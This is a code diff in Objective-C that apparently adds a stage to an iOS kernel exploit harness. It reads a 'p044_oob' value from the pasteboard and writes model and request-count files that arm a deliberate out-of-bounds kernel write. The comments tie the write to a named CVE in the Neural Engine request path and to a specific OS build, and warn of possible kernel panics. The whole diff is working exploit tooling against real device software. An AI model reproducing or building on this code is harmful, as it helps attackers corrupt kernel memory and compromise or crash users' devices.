@@ -125,6 +125,49 @@
             ok ? @"VERIFY" : @"FAILED"];
     }
 
+    /* v5.5: THE 23F77 43748 CROSSING SWITCH. Pasteboard marker
+       "p044_oob=<n>" (193..254) arms the bundled 254-in model AND the
+       request in-count in one tap. 23F77 kernel gate allows in+out<=255
+       (cve43748_ANE_ProgramSendRequest_count_gate) while the mapRequest
+       object is the 192-record 0xC00 object (data.kalloc.3072), so
+       records 193..255 are the LIVE OOB write. 24A435 widened the object
+       to 255 slots — safe there; run this on the 12 (23F77) ONLY.
+       PANIC-POSSIBLE. The marker wins over the v3.4 model upgrade and the
+       absent-only req_in default; it touches nothing else. */
+    {
+        id pb = ((id (*)(Class, SEL))objc_msgSend)(
+            NSClassFromString(@"UIPasteboard"),
+            NSSelectorFromString(@"generalPasteboard"));
+        NSString *pbs = pb ? ((NSString *(*)(id, SEL))objc_msgSend)(
+            pb, NSSelectorFromString(@"string")) : nil;
+        long oob = 0;
+        if (pbs.length) {
+            NSRange mk = [pbs rangeOfString:@"p044_oob="];
+            if (mk.location != NSNotFound) {
+                NSUInteger at = mk.location + mk.length;
+                NSUInteger e = at;
+                while (e < pbs.length) {
+                    unichar ch = [pbs characterAtIndex:e];
+                    if (ch < '0' || ch > '9') break;
+                    e++;
+                }
+                if (e > at) oob = [[pbs substringWithRange:
+                    NSMakeRange(at, e - at)] intValue];
+            }
+        }
+        if (oob >= 193 && oob <= 254) {
+            BOOL m = [@"XVRC27_254in_1out_addchain\n" writeToFile:modelPath
+                        atomically:YES encoding:NSUTF8StringEncoding error:nil];
+            BOOL r = [[NSString stringWithFormat:@"%ld\n", oob]
+                        writeToFile:reqPath atomically:YES
+                        encoding:NSUTF8StringEncoding error:nil];
+            [out appendFormat:@"[v5.5] OOB ARM %@: p044_model.txt=XVRC27_254in_1out_addchain, p044_req_in.txt=%ld (23F77 43748 crossing: gate 255 vs 192-record object; PANIC-POSSIBLE — one tap, fresh boot, 12 only)\n",
+                (m && r) ? @"VERIFY" : @"FAILED", oob];
+        } else if (oob != 0) {
+            [out appendFormat:@"[v5.5] p044_oob=%ld outside 193..254 — NOT armed (OOB knob only)\n", oob];
+        }
+    }
+
     /* v5.1: the per-install split — the SAME binary ships two installs, and
        house_arrest cannot deliver files between them (2026-11-01 law), so
        p146 writes each side's own knob set in-app:
